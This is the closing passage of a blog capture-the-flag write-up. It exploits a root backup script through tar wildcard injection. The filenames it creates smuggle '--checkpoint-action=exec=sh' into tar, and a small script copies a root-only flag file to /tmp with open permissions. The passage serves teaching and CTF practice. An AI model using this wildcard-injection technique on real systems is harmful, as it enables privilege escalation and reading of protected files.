+</span></span><span class=line><span class=cl>drwxr-xr-x   <span class=m>2</span> root root <span class=m>4096</span> Oct <span class=m>20</span> 10:40 boot
+</span></span><span class=line><span class=cl><span class=o>[</span>...<span class=o>]</span>
+</span></span></code></pre></td></tr></table></div></div><p>The <code>backup.sh</code> file is not a regular linux file :p</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ cat /backup.sh
+</span></span><span class=line><span class=cl><span class=c1>#!/bin/sh</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>/bin/rm -rf /backups/*
+</span></span><span class=line><span class=cl><span class=nb>cd</span> /opt/src/ <span class=o>&amp;&amp;</span> /bin/tar -cvzf /backups/bck-src_<span class=sb>`</span>/bin/date +<span class=s2>&#34;%Y-%m-%d_%H%M&#34;</span><span class=sb>`</span>.tar.gz *
+</span></span><span class=line><span class=cl>/bin/chmod <span class=m>440</span> -R /backups
+</span></span></code></pre></td></tr></table></div></div><p>Ok, the exploit is tar wildcard: <a href=https://thanat0s.trollprod.org/2014/07/et-hop-ca-root/ target=_blank rel="noopener noreffer">https://thanat0s.trollprod.org/2014/07/et-hop-ca-root/</a></p><h3 id=exploit>Exploit</h3><p>First, where is the flag:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ ls -la /opt/src 
+</span></span><span class=line><span class=cl>total <span class=m>12</span>
+</span></span><span class=line><span class=cl>drwxrwxrwx <span class=m>1</span> root root <span class=m>4096</span> Dec <span class=m>21</span> 19:03 .
+</span></span><span class=line><span class=cl>drwxr-xr-x <span class=m>1</span> root root <span class=m>4096</span> Dec <span class=m>20</span> 18:27 ..
+</span></span><span class=line><span class=cl>-r--r----- <span class=m>1</span> root root   <span class=m>26</span> Dec <span class=m>20</span> 18:24 .flag.txt
+</span></span></code></pre></td></tr></table></div></div><p>Second, exploit time :D</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ touch -- <span class=s1>&#39;--checkpoint-action=exec=sh install_suidbackdoor.sh&#39;</span> <span class=s1>&#39;--checkpoint=1&#39;</span>
+</span></span><span class=line><span class=cl>$ <span class=nb>echo</span> <span class=s1>&#39;cp /opt/src/.flag.txt /tmp/flag_maki&#39;</span> &gt; install_suidbackdoor.sh
+</span></span><span class=line><span class=cl>$ <span class=nb>echo</span> <span class=s1>&#39;chmod 777 /tmp/flag_maki&#39;</span> &gt;&gt; install_suidbackdoor.sh
+</span></span></code></pre></td></tr></table></div></div><p>After a minute:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ ls -la /tmp/flag_maki
+</span></span><span class=line><span class=cl>-rwxrwxrwx <span class=m>1</span> root root <span class=m>26</span> Dec <span class=m>22</span> 12:32 /tmp/flag_maki
+</span></span></code></pre></td></tr></table></div></div><h3 id=flag-4>Flag</h3><blockquote><p>IMTLD{R04d_T0_Th3_sW1tCH}</p></blockquote></div></div></div></main><footer class=footer><div class=footer-container><div class=footer-line>Powered by <a href=https://gohugo.io/ target=_blank rel="noopener noreffer" title="Hugo 0.100.2">Hugo</a> | Theme - <a href=https://github.com/dillonzq/LoveIt target=_blank rel="noopener noreffer" title="LoveIt 0.2.11"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden=true></i> LoveIt</a></div><div class=footer-line itemscope itemtype=http://schema.org/CreativeWork><i class="far fa-copyright fa-fw" aria-hidden=true></i><span itemprop=copyrightYear>2017 - 2023</span><span class=author itemprop=copyrightHolder>&nbsp;<a href=maki.bzh/ target=_blank>Maki - Alan Marrec</a></span>&nbsp;|&nbsp;<span class=license><a rel="license external nofollow noopener noreffer" href=https://creativecommons.org/licenses/by-nc/4.0/ target=_blank>CC BY-NC 4.0</a></span></div></div></footer></div><div id=fixed-buttons><a href=# id=back-to-top class=fixed-button title="Back to Top"><i class="fas fa-arrow-up fa-fw" aria-hidden=true></i>
+</a><a href=# id=view-comments class=fixed-button title="View Comments"><i class="fas fa-comment fa-fw" aria-hidden=true></i></a></div><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/css/lightgallery-bundle.min.css><script type=text/javascript src=https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/lightgallery.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/plugins/thumbnail/lg-thumbnail.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/plugins/zoom/lg-zoom.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/sharer.js@0.5.1/sharer.min.js></script><script type=text/javascript>window.config={code:{copyTitle:"Copy to clipboard",maxShownLines:50},comment:{},lightgallery:!0}</script><script type=text/javascript src=/maki.bzh/js/theme.min.js></script><script type=text/javascript>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag('js',new Date),gtag('config','G-WVPYCS7SPM',{anonymize_ip:!0})</script><script type=text/javascript src="https://www.googletagmanager.com/gtag/js?id=G-WVPYCS7SPM" async></script></body></html>
